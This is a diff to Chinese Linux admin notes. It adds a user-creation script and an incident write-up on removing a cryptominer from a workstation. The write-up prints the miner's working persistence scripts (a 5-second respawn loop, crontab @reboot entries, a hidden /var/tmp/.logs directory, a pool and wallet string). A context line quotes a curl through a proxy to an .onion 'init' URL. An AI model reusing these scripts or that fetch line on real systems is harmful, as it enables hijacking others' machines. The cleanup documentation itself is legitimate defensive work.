@@ -54,6 +54,83 @@ passwd
 
 
 
+
+4. 新增用户，并新建家目录、数据目录，建立软链接指向数据目录
+(1) 传递默认参数
+$ cat b.sh 
+name=$1
+name=${name:=default}
+echo $name
+
+$ bash b.sh www 
+
+
+(2) 如果没有参数则报错退出
+$ cat c.sh 
+name=$1
+if [ "$1" == "" ]
+then
+  echo "You must input a username"
+  exit
+fi
+echo $name
+
+$ bash c.sh 
+You must input a username
+$ bash c.sh ww
+ww
+
+
+(3) 
+$ addUser.sh
+##1
+usr=$1
+if [ "$1" == "" ]
+then
+  echo "You must input a username"
+  exit
+fi
+echo "add new user: "$usr
+
+##2
+pass=$2
+if [ "$2" == "" ]
+then
+  pass=`date|md5sum |head -c 10`
+fi
+echo "password: "$pass
+
+##3
+useradd -s /bin/bash -d /home/${usr} -m ${usr}
+mkdir /data/${usr}
+chown ${usr} /data/${usr}
+chgrp ${usr} /data/${usr}
+
+ln -s /data/${usr} /home/${usr}/data
+##4
+#echo $pass | passwd  $usr --stdin
+echo "${usr}:${pass}" >${pass}.log
+chpasswd < ${pass}.log
+rm ${pass}.log
+
+echo "done!"
+
+运行 
+$ sudo bash addUser.sh wuxc
+add new user: wuxc
+password: 9ddc1ad13f
+
+
+############
+删除用户 
+$ usr="yuanx"
+$ sudo userdel -r ${usr}
+$ sudo rm -rf /data/${usr}
+
+
+
+
+
 ========================================
 |-- [批量]添加与删除用户名和密码
 ----------------------------------------
@@ -1048,7 +1125,189 @@ curl -4fsSLkA- -m200 -x socks5h://145.239.64.40:9050 unixdbnuadxmwtob.onion/init
 
 
 ========================================
+|-- 又遇到一个挖矿的 on 工作站上
 ----------------------------------------
+
+1. 显示 shell 巨慢，打开 htop 可拿到 swp 占用很大: 1.77G / 2G
+htop 看到一个 zxl 用户在运行一个带端口的命令
+关键词 /tmp/eth/./ethminer -P stratuml+tcp://0x6e819xxxx.wjl:thelegenddavid123@yahoo.com@eth-asial.nanopool.org:9999 --report-hashrate
+
+百度了一下，是在挖矿。
+--> Ethminer挖矿软件使用教程_Public net-CSDN博客_ethminer
+
+
+(1) 先关掉账号
+
+1) 如何暂停一个用户？
+如果你只是想让某一用户“暂时不启用”，将/etc/shadow里最后 倒数第二个字段(最后2个:之间)设置为0，就可以让改账号无法使用。
+参考上面的/etc/shadow介绍可知，将账号立即失效。
+
+$ su sam
+Password: 
+Your account has expired; please contact your system administrator
+su: Authentication failure
+
+
+2) 如何冻结一个账号？
+冻结前:
+sam:x:1002:1002::/usr/sam:/bin/bash
+冻结
+$ sudo passwd -l sam
+passwd: password expiry information changed.
+冻结后
+$ su sam
+Password: 
+su: Authentication failure
+看来是这里第一个:后加了个!号。
+sam:!$6$oFDnwxS.$sDnfS1VtQ2e48K3fzvlIAfqknq.kiqKwifwKjRD4yJJX2e.CChszRwAIo4qzEqGB8V7fV.qpTzFkkKdz5XKei.:17708:0:99999:7:::
+
+密码冻结解开 
+$ sudo passwd -u sam
+passwd: password expiry information changed.
+
+可登陆了。
+sam:$6$oFDnwxS.$sDnfS1VtQ2e48K3fzvlIAfqknq.kiqKwifwKjRD4yJJX2e.CChszRwAIo4qzEqGB8V7fV.qpTzFkkKdz5XKei.:17708:0:99999:7:::
+
+
+
+
+3) 实施冻结账号
+$ sudo passwd -l zxl
+[sudo] password for wangjl: 
+passwd: password expiry information changed.
+
+
+$ sudo vim /etc/shadow
+最后2个:之间添加0.
+
+
+
+
+
+
+(2) 清理挖矿的程序
+$ cd /tmp/eth/
+$ ls -lth
+total 6.8M
+-rwxr-xr-x 1 zxl zxl  956 Jan  4 09:54 run
+-rwxr-xr-x 1 zxl zxl  290 Jan  4 09:53 1
+-rwxr-xr-x 1 zxl zxl 6.8M Jan  4 09:53 ethminer
+
+也就是从1月4日 就开始了。
+主程序是 ethminer，其余两个是脚本，每5秒检测一次，防止自己被干掉。
+需要写一个脚本，一次关掉所有进程，并修改这个文件夹的名字。
+
+$ ps -aux | grep ^zxl | awk '{print $2}'
+4724
+4727
+15933
+15934
+17526
+19867
+29597
+
+## 
+$ cat 01.sh
+ps -aux | grep ^zxl | awk '{print $2}' | xargs -i kill -9 {}
+mv /tmp/eth /tmp/eth2
+
+$ sudo bash 01.sh
+
+安静了!
+
+
+
+
+
+1)
+$ vim 1
+#!/bin/bash
+locatie=$(cat /var/tmp/.logs/.local)
+
+if ! pgrep -x ethminer >/dev/null; then
+        $locatie/./ethminer -P stratum1+tcp://0x6e8195519e42e937f83a61bc8c9b3ae62641bc77.w1:thelegenddavid123@yahoo.com@eth-asia1.nanopool.org:9999 --report-hashrate > /dev/null 2>&1 & disown $*
+else
+        :
+fi
+
+
+
+2) 
+$ vim run 
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 > /dev/null 2>&1 & disown"
+fi
+
+locatie=$(cat /var/tmp/.logs/.local)
+if [ -f /var/tmp/.logs/.local ]; then
+        :
+else
+        if [ -d /var/tmp/.logs ]; then
+                echo $(pwd) > /var/tmp/.logs/.local
+        else
+                mkdir /var/tmp/.logs
+                echo $(pwd) > /var/tmp/.logs/.local
+        fi
+fi
+
+crontabcalumea() {
+        if ! crontab -l | grep -q 'run'; then
+                rm -rf $(cat /var/tmp/.logs/.local)/.tempo
+                echo "@daily $(cat /var/tmp/.logs/.local)/1" >> $(cat /var/tmp/.logs/.local)/.tempo
+                sleep 1
+                echo "@reboot $(cat /var/tmp/.logs/.local)/run > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
+                sleep 1
+                echo "@monthly $(cat /var/tmp/.logs/.local)/run  > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
+                sleep 1
+                crontab $(cat /var/tmp/.logs/.local)/.tempo
+                sleep 1
+                rm -rf $(cat /var/tmp/.logs/.local)/.tempo
+        fi
+}
+
+
+sleep 5
+while :
+do
+$(cat /var/tmp/.logs/.local)/1
+crontabcalumea
+sleep 5
+done
+
+
+
+
+
+
+(3) 检查有 sudo 权限的用户
+
+$ sudo vim /etc/sudoers
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+
+/etc/group 中 
+	admin 的组id号是116 lpadmin:x:116:hgyi
+	sudo 的组id号是27 sudo:x:27:hgyi
+
+/etc/passwd 下存放的是用户的属性，
+依次是用户名:密码占位符:用户ID:组ID……
+比如test1:x:501:500………… 则500就是组id
+
+
+还有另外一种可能就是附加组。这个的话直接看/etc/group下就知道了，如果这个组是属于某用户的附加组，会在这个组后面直接显示成员。
+比如cat /etc/group
+test:x:500:test3,test4
+test3和test4也属于test组，不过这个是附加组。
+
+
+
+
 
 
 
